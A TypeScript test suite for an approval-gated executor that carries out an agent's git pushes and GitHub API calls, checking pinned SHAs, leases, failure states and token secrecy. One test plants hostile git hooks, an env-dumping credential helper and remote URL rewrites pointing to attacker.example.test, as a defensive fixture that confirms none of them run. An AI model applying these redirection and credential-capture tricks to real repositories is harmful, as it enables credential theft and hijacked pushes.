import { afterEach, expect, test } from "bun:test";
import { chmodSync, existsSync, mkdirSync, readdirSync, readFileSync, rmSync, statSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { effectToolNames } from "../src/exec/effect-tools";
import type { ScriptedTools } from "../src/team/scripted-port";
import {
  answer, connection, decide, effectFixture, git, rid, send, setLevel, setRemote, settle, texts,
  type EffectFixture, type EffectFixtureOptions, type FetchCall,
} from "./fixtures/effects";

const fixtures: EffectFixture[] = [];
afterEach(async () => {
  for (const f of fixtures.splice(0)) { await f.close(); rmSync(f.root, { recursive: true, force: true }); rmSync(dirname(f.box.root), { recursive: true, force: true }); }
});
const githubToken = () => `ghp_${rid().replaceAll("-", "")}${rid().replaceAll("-", "").slice(0, 4)}`;

/** Every file under `dir` (recursively) that contains `needle`. */
function filesContaining(dir: string, needle: string): string[] {
  const hits: string[] = [];
  const walk = (path: string) => {
    if (!existsSync(path)) return;
    const stats = statSync(path);
    if (stats.isDirectory()) { for (const name of readdirSync(path)) walk(join(path, name)); return; }
    if (readFileSync(path).includes(Buffer.from(needle))) hits.push(path);
  };
  walk(dir); return hits;
}

type Call = { name: string; input: unknown };
async function proposing(options: EffectFixtureOptions = {}) {
  const queue: Call[] = [], results: Awaited<ReturnType<ScriptedTools["call"]>>[] = [];
  const f = await effectFixture({ ...options, script: async (request, _s, _o, tools) => {
    for (const call of queue.splice(0)) results.push(await tools.call(call.name, call.input));
    return answer(request, JSON.stringify({ reply: "เสนอแล้ว" }));
  } });
  fixtures.push(f);
  const propose = async (name: string, input: unknown) => {
    queue.push({ name, input });
    send(f, "ทำให้หน่อย");
    await settle(f);
    return results.at(-1)!;
  };
  return { f, propose };
}

/**
 * A git push fixture: a repository in the box workspace with one commit on `main`, a local bare repository standing
 * in for the https remote (through the executor's test-only `localRemote` seam), and an owner remote `origin` bound
 * to a GitHub token connection.
 */
async function pushFixture() {
  const remotes = new Map<string, string>();
  const { f, propose } = await proposing({ executor: { localRemote: url => remotes.get(url) ?? "/nonexistent" } });
  const bare = join(f.root, "remote.git");
  git(f.root, "init", "--quiet", "--bare", bare);
  remotes.set("https://github.com/owner/repo.git", bare);
  const repo = f.box.root;
  git(repo, "init", "--quiet");
  writeFileSync(join(repo, "README.md"), "สวัสดี\n");
  git(repo, "add", "README.md");
  git(repo, "commit", "--quiet", "-m", "first commit");
  const first = git(repo, "rev-parse", "HEAD");
  // The remote already has the first commit, and the box tracks it as origin/main.
  git(repo, "push", "--quiet", bare, "main:refs/heads/main");
  git(repo, "update-ref", "refs/remotes/origin/main", first);
  writeFileSync(join(repo, "app.ts"), "export const answer = 42;\n");
  git(repo, "add", "app.ts");
  git(repo, "commit", "--quiet", "-m", "add the answer");
  const second = git(repo, "rev-parse", "HEAD");
  setLevel(f, "full");
  const token = githubToken();
  setRemote(f, connection(f, "github_token", token));
  return { f, propose, bare, repo, first, second, token };
}
/** Approves through the owner command; the application hands the card to the executor, which this awaits. */
async function approve(f: EffectFixture, cardId: string) {
  decide(f, f.app.approvalCard(f.auth.actor, f.project.id, cardId), "approve");
  await f.executor.idle();
  return f.app.approvalCard(f.auth.actor, f.project.id, cardId);
}
const remoteHead = (bare: string, branch = "main") => { try { return git(bare, "rev-parse", `refs/heads/${branch}`); } catch { return null; } };
async function proposePush(propose: (name: string, input: unknown) => Promise<{ content: string; isError?: boolean }>, branches: unknown[] = [{ branch: "main" }]) {
  const result = await propose(effectToolNames["effect.git_push"], { remote: "origin", branches });
  expect(result.isError).toBeUndefined();
  return (JSON.parse(result.content) as { cardId: string }).cardId;
}

test("an approved push sends exactly the pinned SHAs through the bundle, the mirror and a lease", async () => {
  const { f, propose, bare, first, second, token } = await pushFixture();
  const cardId = await proposePush(propose);
  const card = f.app.approvalCard(f.auth.actor, f.project.id, cardId);
  expect(card.action).toEqual({ kind: "effect.git_push", remote: { name: "origin", url: "https://github.com/owner/repo.git", revision: 1 }, repository: ".",
    updates: [{ ref: "refs/heads/main", oldSha: first, newSha: second }], commits: [{ sha: second, summary: "add the answer" }] });
  expect(card.telegramEligible).toBe(true);
  // Nothing moved before the decision.
  expect(remoteHead(bare)).toBe(first);
  const done = await approve(f, cardId);
  expect(done).toMatchObject({ state: "succeeded", receipt: { outcome: "succeeded", detail: { updates: [{ ref: "refs/heads/main", oldSha: first, newSha: second }] } } });
  expect(remoteHead(bare)).toBe(second);
  // The Jit-owned mirror sits beside the workspace, outside the box, with fixed config and no hooks.
  const mirror = join(f.execution, f.project.id, "mirror.git");
  expect(readFileSync(join(mirror, "config"), "utf8")).toBe("[core]\n\trepositoryformatversion = 0\n\tfilemode = true\n\tbare = true\n");
  expect(existsSync(join(mirror, "hooks"))).toBe(false);
  // The bundle and temporary refs are gone; the credential is nowhere in the box, the mirror or the conversation.
  expect(existsSync(join(f.box.root, ".jit-effects", `${cardId}.bundle`))).toBe(false);
  expect(git(f.box.root, "for-each-ref", "refs/jit-effect/")).toBe("");
  expect(filesContaining(f.box.root, token)).toEqual([]);
  expect(filesContaining(join(f.execution, f.project.id), token)).toEqual([]);
  expect(texts(f).join("\n")).not.toContain(token);
  expect(texts(f).some(text => text.includes("effect.git_push") && text.includes(`main ${first.slice(0, 12)}→${second.slice(0, 12)}`))).toBe(true);
});

test("a commit added in the box after the card is never pushed: the remote ends at the approved SHA", async () => {
  const { f, propose, bare, repo, second } = await pushFixture();
  const cardId = await proposePush(propose);
  writeFileSync(join(repo, "later.ts"), "export const later = true;\n");
  git(repo, "add", "later.ts");
  git(repo, "commit", "--quiet", "-m", "added after the card");
  const later = git(repo, "rev-parse", "HEAD");
  expect((await approve(f, cardId)).state).toBe("succeeded");
  expect(remoteHead(bare)).toBe(second);
  expect(remoteHead(bare)).not.toBe(later);
  expect(() => git(bare, "cat-file", "-e", `${later}^{commit}`)).toThrow();
});

test("an approved SHA the box no longer has fails the card as stale and pushes nothing", async () => {
  const { f, propose, bare, repo, first, second } = await pushFixture();
  const cardId = await proposePush(propose);
  // The box rewrites history and drops the approved commit entirely.
  git(repo, "reset", "--quiet", "--hard", first);
  writeFileSync(join(repo, "other.ts"), "export const other = 1;\n");
  git(repo, "add", "other.ts");
  git(repo, "commit", "--quiet", "-m", "rewritten");
  git(repo, "reflog", "expire", "--expire=now", "--all");
  git(repo, "gc", "--quiet", "--prune=now");
  expect(() => git(repo, "cat-file", "-e", `${second}^{commit}`)).toThrow();
  expect(await approve(f, cardId)).toMatchObject({ state: "failed", reason: "stale" });
  expect(remoteHead(bare)).toBe(first);
});

test("a remote that moved away from the approved old SHA is rejected by the lease", async () => {
  const { f, propose, bare, first, second } = await pushFixture();
  const cardId = await proposePush(propose);
  // Someone else pushes to the remote after the card was made.
  const elsewhere = join(f.root, "elsewhere");
  git(f.root, "clone", "--quiet", bare, elsewhere);
  writeFileSync(join(elsewhere, "theirs.ts"), "export const theirs = 1;\n");
  git(elsewhere, "add", "theirs.ts");
  git(elsewhere, "commit", "--quiet", "-m", "their change");
  git(elsewhere, "push", "--quiet", "origin", "main");
  const theirs = git(elsewhere, "rev-parse", "HEAD");
  expect(theirs).not.toBe(first);
  const done = await approve(f, cardId);
  expect(done).toMatchObject({ state: "failed", reason: "lease_rejected", receipt: { outcome: "failed" } });
  expect(remoteHead(bare)).toBe(theirs);
  expect(remoteHead(bare)).not.toBe(second);
});

test("a new branch is created only if the remote still has none (empty lease)", async () => {
  const { f, propose, bare, second } = await pushFixture();
  const cardId = await proposePush(propose, [{ branch: "feature/answer", source: "main", oldSha: "new" }]);
  const card = f.app.approvalCard(f.auth.actor, f.project.id, cardId);
  expect(card.action).toMatchObject({ updates: [{ ref: "refs/heads/feature/answer", oldSha: null, newSha: second }] });
  expect((await approve(f, cardId)).state).toBe("succeeded");
  expect(remoteHead(bare, "feature/answer")).toBe(second);
});

test("repository hooks and config in the box cannot run on the host or see the credential", async () => {
  const { f, propose, bare, repo, second, token } = await pushFixture();
  const markers = join(f.root, "markers");
  mkdirSync(markers);
  const evil = (name: string) => {
    const path = join(repo, ".git", `evil-${name}.sh`);
    writeFileSync(path, `#!/bin/sh\nenv > ${join(markers, name)}\nexit 0\n`);
    chmodSync(path, 0o755);
    return path;
  };
  // Every hook the push path could trigger, plus config that would run commands or redirect credentials.
  mkdirSync(join(repo, ".git", "hooks"), { recursive: true });
  for (const hook of ["pre-push", "reference-transaction", "post-checkout", "pre-commit", "post-update", "pre-receive", "update"]) {
    writeFileSync(join(repo, ".git", "hooks", hook), `#!/bin/sh\nenv > ${join(markers, `hook-${hook}`)}\n`);
    chmodSync(join(repo, ".git", "hooks", hook), 0o755);
  }
  git(repo, "config", "core.sshCommand", evil("ssh"));
  git(repo, "config", "core.fsmonitor", evil("fsmonitor"));
  git(repo, "config", "credential.helper", `!${evil("credential")}`);
  git(repo, "config", "remote.origin.url", "ssh://attacker.example.test/steal.git");
  git(repo, "config", "remote.origin.pushurl", "ssh://attacker.example.test/steal.git");
  git(repo, "config", "url.ssh://attacker.example.test/.insteadOf", "https://github.com/");
  const cardId = await proposePush(propose);
  expect((await approve(f, cardId)).state).toBe("succeeded");
  // The push reached the owner's pinned remote, not the box's configured one, and nothing box-controlled ran.
  expect(remoteHead(bare)).toBe(second);
  expect(readdirSync(markers)).toEqual([]);
  expect(filesContaining(f.box.root, token)).toEqual([]);
  expect(filesContaining(markers, token)).toEqual([]);
});

test("GitHub effects call only the endpoint the card names, with the bound token, through protocol fixtures", async () => {
  const replies: ((call: FetchCall) => Response)[] = [];
  const { f, propose } = await proposing({ fetch: call => (replies.shift() ?? (() => new Response("{}", { status: 500 })))(call) });
  setLevel(f, "full");
  const token = githubToken();
  setRemote(f, connection(f, "github_token", token));
  const card = async (name: string, input: unknown) => approve(f, (JSON.parse((await propose(name, input)).content) as { cardId: string }).cardId);
  replies.push(() => new Response(JSON.stringify({ number: 12, html_url: "https://github.com/owner/repo/pull/12", body: "secret-free" }), { status: 201 }));
  expect(await card(effectToolNames["effect.github_pr_create"], { remote: "origin", base: "main", head: "feature/answer", title: "เพิ่มคำตอบ", body: "รายละเอียด" }))
    .toMatchObject({ state: "succeeded", receipt: { detail: { endpoint: "https://api.github.com/repos/owner/repo/pulls", status: 201, number: 12, url: "https://github.com/owner/repo/pull/12" } } });
  replies.push(() => new Response(JSON.stringify({ id: 99, html_url: "https://github.com/owner/repo/issues/7#issuecomment-99" }), { status: 201 }));
  expect((await card(effectToolNames["effect.github_comment"], { remote: "origin", issueNumber: 7, body: "ขอบคุณครับ" })).state).toBe("succeeded");
  const head = "c".repeat(40);
  replies.push(() => new Response(JSON.stringify({ sha: "d".repeat(40), merged: true }), { status: 200 }));
  expect((await card(effectToolNames["effect.github_pr_merge"], { remote: "origin", pullNumber: 12, headSha: head, method: "squash" })).state).toBe("succeeded");
  expect(f.fetches.map(call => [call.method, call.url, call.body])).toEqual([
    ["POST", "https://api.github.com/repos/owner/repo/pulls", { title: "เพิ่มคำตอบ", head: "feature/answer", base: "main", body: "รายละเอียด", draft: false }],
    ["POST", "https://api.github.com/repos/owner/repo/issues/7/comments", { body: "ขอบคุณครับ" }],
    ["PUT", "https://api.github.com/repos/owner/repo/pulls/12/merge", { sha: head, merge_method: "squash" }],
  ]);
  for (const call of f.fetches) expect(call.headers.authorization).toBe(`Bearer ${token}`);
  // A head that moved is a 409: the merge fails as stale. A server error fails; a transport error is unknown.
  replies.push(() => new Response(JSON.stringify({ message: "Head branch was modified" }), { status: 409 }));
  expect(await card(effectToolNames["effect.github_pr_merge"], { remote: "origin", pullNumber: 12, headSha: head })).toMatchObject({ state: "failed", reason: "stale" });
  replies.push(() => new Response("oops", { status: 500 }));
  expect(await card(effectToolNames["effect.github_comment"], { remote: "origin", issueNumber: 7, body: "อีกครั้ง" })).toMatchObject({ state: "failed", reason: "http_500" });
  replies.push(() => { throw new TypeError("network down"); });
  expect(await card(effectToolNames["effect.github_comment"], { remote: "origin", issueNumber: 7, body: "อีกครั้ง" })).toMatchObject({ state: "unknown", reason: "transport_error" });
  expect(JSON.stringify(f.app.approvalCards(f.auth.actor, f.project.id))).not.toContain(token);
  // A remote changed after the card was made fails the card before any call.
  const { cardId } = JSON.parse((await propose(effectToolNames["effect.github_comment"], { remote: "origin", issueNumber: 7, body: "หลังเปลี่ยน" })).content) as { cardId: string };
  setRemote(f, connection(f, "github_token", githubToken()), { url: "https://github.com/owner/renamed.git", github: { owner: "owner", repo: "renamed", apiBase: "https://api.github.com" } });
  const calls = f.fetches.length;
  expect(await approve(f, cardId)).toMatchObject({ state: "failed", reason: "target_changed" });
  expect(f.fetches).toHaveLength(calls);
});

test("a crash after the claim yields unknown on the next boot and tells the topic the outcome is unknown", async () => {
  let die!: (error: Error) => void;
  const hang = new Promise<void>((_, reject) => { die = reject; });
  const remotes = new Map<string, string>();
  const { f, propose } = await proposing({ executor: { afterClaim: () => hang, localRemote: url => remotes.get(url) ?? "/nonexistent" } });
  setLevel(f, "full");
  setRemote(f, connection(f, "github_token", githubToken()));
  const { cardId } = JSON.parse((await propose(effectToolNames["effect.github_comment"], { remote: "origin", issueNumber: 1, body: "hi" })).content) as { cardId: string };
  decide(f, f.app.approvalCard(f.auth.actor, f.project.id, cardId), "approve");
  await Bun.sleep(20);
  expect(f.executor.reconcile()).toEqual([cardId]);
  die(new Error("process died"));
  await f.executor.idle();
  expect(f.app.approvalCard(f.auth.actor, f.project.id, cardId)).toMatchObject({ state: "unknown", reason: "interrupted" });
  expect(f.fetches).toEqual([]);
  // Owner attention: exactly one topic message, saying the outcome is unknown and that Jit will not retry.
  const posted = texts(f).filter(text => text.includes(cardId.slice(0, 8)));
  expect(posted).toHaveLength(1);
  expect(posted[0]).toContain("interrupted");
  expect(posted[0]).toContain("ไม่ทราบผล");
});

test("without the local test seam the bundle still reaches the mirror, and an unreachable https remote is unknown, not a retry", async () => {
  const { f, propose } = await proposing();
  const repo = f.box.root;
  git(repo, "init", "--quiet");
  writeFileSync(join(repo, "README.md"), "x\n");
  git(repo, "add", "README.md");
  git(repo, "commit", "--quiet", "-m", "only commit");
  const head = git(repo, "rev-parse", "HEAD");
  setLevel(f, "full");
  // Port 1 on loopback refuses the connection: the push cannot be confirmed either way.
  setRemote(f, connection(f, "github_token", githubToken()), { url: "https://127.0.0.1:1/owner/repo.git", github: null });
  const cardId = await proposePush(propose, [{ branch: "main", oldSha: "new" }]);
  const done = await approve(f, cardId);
  expect(done).toMatchObject({ state: "unknown", reason: "push_unconfirmed" });
  // The approved commit did reach the Jit mirror through the bundle (file transport allowed for that fetch only).
  expect(git(join(f.execution, f.project.id, "mirror.git"), "cat-file", "-t", head)).toBe("commit");
});

test("bad push proposals are refused before any card", async () => {
  const { f, propose } = await pushFixture();
  for (const input of [
    { remote: "upstream", branches: [{ branch: "main" }] },
    { remote: "origin", branches: [{ branch: "../main" }] },
    { remote: "origin", branches: [{ branch: "main", source: "nope" }] },
    { remote: "origin", repository: "../outside", branches: [{ branch: "main" }] },
    { remote: "origin", branches: [{ branch: "main", oldSha: "short" }] },
  ]) expect((await propose(effectToolNames["effect.git_push"], input)).isError).toBe(true);
  expect(f.app.approvalCards(f.auth.actor, f.project.id)).toEqual([]);
});
